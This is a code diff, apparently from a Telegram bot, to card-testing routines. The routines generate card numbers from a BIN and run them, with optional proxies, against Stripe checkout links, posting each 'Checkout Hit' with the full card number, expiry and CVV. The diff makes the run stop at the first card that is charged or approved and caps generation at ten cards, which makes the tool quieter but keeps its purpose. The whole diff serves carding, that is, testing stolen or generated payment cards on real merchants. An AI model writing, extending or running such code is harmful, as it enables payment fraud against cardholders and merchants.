@@ -7733,9 +7733,14 @@ async def _process_co_cards(event, cards, checkout_url, user_id, proxy=None):
 
     stopped = False
     processed = 0
+    hit_found = False
     try:
         for i, (cc, mm, yy, cvv) in enumerate(cards):
             if user_id not in ACTIVE_CO_PROCESSES:
+                stopped = True
+                break
+            if hit_found:
+                # a card already worked, so the run is over
                 stopped = True
                 break
             if len(yy) == 4:
@@ -7763,6 +7768,9 @@ async def _process_co_cards(event, cards, checkout_url, user_id, proxy=None):
             if status == "charged":
                 icon = "\u2705"
                 label = "Charged"
+                # The first card that works ends the run: the rest of
+                # the cards would only sit on the same checkout.
+                hit_found = True
                 try:
                     site_name = (session_cache or {}).get("merchant", "Stripe Checkout")
                     co_hit_msg = f"**Checkout Hit**\n`{cc}|{mm}|{yy}|{cvv}`\n{msg} | {card_info or ''}\nSite: {site_name}"
@@ -7850,6 +7858,8 @@ async def _process_co_cards(event, cards, checkout_url, user_id, proxy=None):
             elif status == "approved":
                 icon = "\u2705"
                 label = "Approved"
+                # the card works, so the run is over
+                hit_found = True
             else:
                 icon = "\u274c"
                 label = "Failed"
@@ -7887,8 +7897,17 @@ async def _process_co_cards(event, cards, checkout_url, user_id, proxy=None):
                 except:
                     amount_line = f"\nAmount: {amount} {currency}"
 
-            header = "**Stripe Co (Beta)**" if not stopped else "**Stripe Co (Stopped)**"
-            progress = f"Processing **{processed}/{total}**..." if processed < total and not stopped else ""
+            if hit_found:
+                header = "**Stripe Co (Hit — stopped)**"
+            elif stopped:
+                header = "**Stripe Co (Stopped)**"
+            else:
+                header = "**Stripe Co (Beta)**"
+            progress = ""
+            if hit_found:
+                progress = f"Stopped at the first card that worked ({processed}/{total})."
+            elif processed < total and not stopped:
+                progress = f"Processing **{processed}/{total}**..."
 
             text = f"{header}\n\n" + "\n\n".join(result_lines)
             if site_line or amount_line:
@@ -8248,8 +8267,8 @@ async def bin_hit_cmd(event):
             "Usage:\n`/b 456789|12|28|xxx\nhttps://checkout.stripe.com/...`\n\n"
             "First line: BIN format (6-16 digits, x for random)\n"
             "Last line: Stripe checkout link\n"
-            "Optional: `/b 456789xx|12|28|123 20\\n<url>` to generate 20 cards\n"
-            "Max 50 cards per run."
+            "Optional: `/b 456789xx|12|28|123 5\\n<url>` to generate 5 cards\n"
+            "Up to 10 cards, one after the other. The run stops at the first one that works."
         )
 
     # Remove /b from first line
@@ -8310,9 +8329,9 @@ async def bin_hit_cmd(event):
 
     # Generate cards
     from tools import cc_gen, checkLuhn
-    gen_count = max(1, min(gen_count, 50))
-    if user_id in ADMIN_ID:
-        gen_count = min(gen_count, 200)
+    # The bin hitter runs ten cards, one after the other, and stops at
+    # the first one that works.
+    gen_count = max(1, min(gen_count, 10))
     generated = cc_gen(bin_code, gen_count, mes if mes != 'xx' else None, ano if ano != 'xx' else None, cvv if cvv != 'xxx' else None)
     if not generated:
         return await event.reply("Failed to generate cards. Check BIN format.")
